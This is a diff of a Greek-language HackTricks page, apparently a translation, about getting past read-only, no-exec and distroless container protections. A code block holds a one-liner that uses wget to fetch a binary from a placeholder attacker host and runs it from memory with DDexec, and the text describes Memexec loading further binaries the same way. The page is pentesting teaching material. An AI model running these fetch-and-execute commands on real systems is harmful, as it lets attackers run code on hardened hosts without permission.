@@ -1,4 +1,4 @@
-# Παράκαμψη προστασίας FS: μόνο για ανάγνωση / χωρίς εκτέλεση / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Αν σας ενδιαφέρει η **καριέρα στο χάκινγκ** και το χάκαρισμα του αδύνατου - **σας προσλαμβάνουμε!** (_απαιτείται άριστη γνώση γραπτού και προφορικού Πολωνικών_).
 
@@ -81,10 +81,12 @@ securityContext:
 {% hint style="success" %}
 Το **DDexec / EverythingExec** θα σας επιτρέψει να φορτώσετε και να **εκτελέσετε** το δικό σας **shellcode** ή **οποιοδήποτε δυαδικό** από τη **μνήμη**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 ### MemExec
 
 [**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένα **DDexec shellcode demonised**, οπότε κάθε φορά που θέλετε να **εκτελέσετε ένα διαφορετικό δυαδικό** δεν χρειάζεται να ξαναξεκινήσετε το DDexec, μπορείτε απλά να εκτελέσετε το shellcode memexec μέσω της τεχνικής DDexec και στη συνέχεια **να επικοινωνήσετε με αυτό το δαίμονα για να περάσετε νέα δυαδικά για φόρτωση και εκτέλεση**.
